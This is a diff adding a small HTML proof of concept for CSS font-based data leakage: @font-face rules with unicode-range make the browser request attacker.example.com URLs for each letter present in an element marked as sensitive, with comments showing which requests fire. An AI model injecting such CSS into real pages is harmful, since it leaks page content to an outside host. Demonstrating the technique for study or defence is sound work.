@@ -1,0 +1,32 @@
+
+<html lang="en">
+
+<style>
+@font-face{
+ font-family:poc;
+ src: url(http://attacker.example.com/?A); /* fetched */
+ unicode-range:U+0041;
+}
+@font-face{
+ font-family:poc;
+ src: url(http://attacker.example.com/?B); /* fetched too */
+ unicode-range:U+0042;
+}
+@font-face{
+ font-family:poc;
+ src: url(http://attacker.example.com/?C); /* not fetched */
+ unicode-range:U+0043;
+}
+#sensitive-information{
+ font-family:poc;
+}
+</style>
+
+<body>
+
+    <!-- See requested urls. -->
+    <p id="sensitive-information">AB</p>
+</body>
+</html>
+
+
